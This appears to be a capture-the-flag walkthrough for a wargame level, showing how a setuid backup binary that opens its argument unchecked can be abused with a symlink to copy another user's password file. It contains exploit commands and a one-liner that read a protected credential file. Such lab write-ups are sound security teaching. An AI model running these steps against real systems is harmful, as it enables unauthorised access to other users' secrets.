# Level 08 Walkthrough - Setuid Backup Binary Symlink Read

## 1.1 SSH into VM
```
sshpass -p `cat level07/flag` ssh -o StrictHostKeyChecking=no level08@localhost -p 4242
```

## Binary Behaviour

`level08` is a setuid/setgid backup utility (owner: **level09**, group: **users**):

1. Opens `./backups/.log` for writing (relative to CWD)
2. Calls `log_wrapper` to log "Starting back up: <argv[1]>"
3. Opens **argv[1]** directly with `fopen(argv[1], "r")` — no sanitisation
4. Opens `./backups/<argv[1]>` with `O_WRONLY|O_CREAT|O_EXCL` as destination
5. Copies source -> destination byte by byte via `fgetc` / `write`
6. Logs "Finished back up: <argv[1]>", closes handles

## Vulnerability

`fopen(argv[1], "r")` accepts any path — including symlinks. Because the binary
runs as **level09** (setuid), it can read `/home/users/level09/.pass` which is
inaccessible to level08 directly.

There is no restriction on the source path.

## Filesystem Permissions

The `backups/` directory has an ACL that only grants level08 `r-x`:

```
user::rwx
user:level08:r-x      <- level08 cannot write here
user:level09:r-x
```

So level08 cannot create files in the real backups dir.
The workaround: run the binary from a **tmp directory we control**, where
`./backups/` is a directory we created ourselves.

The default ACL on newly created files (`default:user:level08:r-x`) means
files written by the binary into our tmp backups dir are readable by level08.

## Exploit Steps

```bash
# 1. Create working dir in /tmp with a backups/ subdirectory
mkdir -p /tmp/l08work/backups

# 2. Symlink our "source" name to the protected file
ln -s /home/users/level09/.pass /tmp/l08work/level09pass

# 3. Run the binary from /tmp/l08work — it opens ./backups/.log
#    and ./backups/level09pass relative to our dir, not the real backups/
cd /tmp/l08work
/home/users/level08/level08 level09pass

# 4. Read the copy — created with mode 0660, level08 has r via default ACL
cat /tmp/l08work/backups/level09pass
```

## Why the Home Dir Backups Dir Doesn't Work

`/home/users/level08/backups/` has an ACL that restricts level08 to `r-x`
(no write). Attempts to `mkdir` or `ln` inside it fail with Permission Denied.
Running from `/tmp/` sidesteps this because /tmp is world-writable and we
own the directory we create there.

## One-liner

```bash
mkdir -p /tmp/x/backups && \
ln -s /home/users/level09/.pass /tmp/x/p && \
cd /tmp/x && /home/users/level08/level08 p && \
cat /tmp/x/backups/p
```

